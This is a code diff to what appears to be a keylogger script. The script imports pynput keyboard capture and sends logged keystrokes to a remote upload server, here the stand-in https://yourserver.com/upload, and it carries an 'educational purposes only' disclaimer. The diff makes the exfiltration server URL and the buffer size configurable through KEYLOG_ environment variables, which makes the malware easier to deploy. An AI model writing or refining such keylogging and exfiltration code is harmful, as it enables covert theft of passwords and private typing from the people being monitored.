@@ -6,12 +6,13 @@ For educational purposes only. Ensure compliance with local laws before use.
 """
 
 import base64
+import os
 
 import requests
 from pynput import keyboard
 
-SERVER_URL = "https://yourserver.com/upload"
-BUFFER_SIZE = 1024
+SERVER_URL = os.getenv("KEYLOG_SERVER_URL", "https://yourserver.com/upload")
+BUFFER_SIZE = int(os.getenv("KEYLOG_BUFFER_SIZE", "1024"))
 
 buffer: list[str] = []
 
